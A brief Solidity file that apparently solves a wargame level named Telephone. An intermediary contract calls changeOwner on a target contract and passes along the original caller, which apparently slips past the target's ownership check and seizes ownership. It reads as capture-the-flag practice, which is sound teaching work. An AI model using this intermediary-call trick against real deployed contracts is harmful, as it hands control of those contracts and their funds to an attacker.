// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract IntermidiateContract {
    function changeOwner(address _addr) public {
        ITelephone(_addr).changeOwner(msg.sender);
    }
}
